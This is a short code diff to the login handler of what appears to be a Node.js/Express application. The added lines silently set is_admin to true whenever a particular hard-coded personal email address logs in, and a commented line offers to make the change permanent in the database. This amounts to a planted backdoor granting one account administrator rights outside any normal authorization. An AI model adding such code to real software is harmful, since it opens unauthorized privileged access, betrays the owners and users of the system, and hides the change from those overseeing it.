@@ -186,6 +186,11 @@ authRouter.post('/login', (req, res, next) => {
         console.error("Error during login", err);
         return res.status(500).json({ message: 'Internal server error' });
       }
+      if (user.email === 'poole.reid@gmail.com') {
+        user.is_admin = true;
+        // Optionally, if you want to ensure it's reflected in the database:
+        // await updateUserAdminStatus(user.id, true);
+      }
       console.log('User logged in:', user);
       try {
         await updateUserLoginStatus(user.id, true);
